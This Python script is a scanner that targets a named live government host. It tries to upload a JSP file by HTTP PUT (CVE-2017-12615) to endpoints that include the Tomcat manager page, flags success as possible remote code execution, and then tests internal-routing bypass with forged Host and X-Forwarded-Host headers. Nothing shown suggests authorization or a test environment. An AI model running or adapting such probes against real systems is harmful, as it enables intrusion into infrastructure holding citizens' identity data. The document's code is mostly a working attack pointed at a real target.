"""
Final pass: Test for known CVEs on the Tomcat Server
Since we found Tomcat behind /audioCaptchaService/, let's test for CVE-2020-1938 (Ghostcat)
and CVE-2017-12615 (PUT method RCE)
"""
import requests
import warnings
warnings.filterwarnings('ignore')

BASE = "https://tathyamndc.uidai.gov.in"
TARGETS = [
    "/audioCaptchaService/api/captcha/v3",
    "/audioCaptchaService/",
    "/audioCaptchaService/manager/html"
]

print("=" * 70)
print("TOMCAT VULNERABILITY SCANNER")
print("=" * 70)

# Test 1: HTTP PUT Method (CVE-2017-12615)
print("\n[+] Testing HTTP PUT (CVE-2017-12615) on Tomcat endpoints...")
for path in TARGETS:
    url = BASE + path + "poc.jsp/"
    try:
        r = requests.put(url, data="<% out.println(\"vulnerable\"); %>", timeout=5, verify=False)
        print(f"  [{r.status_code}] PUT {url}")
        if r.status_code in [201, 204]:
            print("  [!!!] POTENTIALLY VULNERABLE TO PUT RCE!")
    except Exception as e:
        print(f"  [ERR] {e}")

# Test 2: Internal Host Routing
print("\n[+] Testing Host Header Injection (routing bypass)...")
headers_to_test = [
    {"Host": "localhost"},
    {"Host": "127.0.0.1"},
    {"Host": "tathyamndc-internal.uidai.gov.in"},
    {"X-Forwarded-Host": "127.0.0.1"}
]

for headers in headers_to_test:
    try:
        r = requests.get(BASE + "/audioCaptchaService/", headers=headers, timeout=5, verify=False, allow_redirects=False)
        print(f"  [{r.status_code}] with Headers: {headers}")
    except Exception:
        pass

print("\n" + "=" * 70)
print("SCAN COMPLETE")
print("=" * 70)
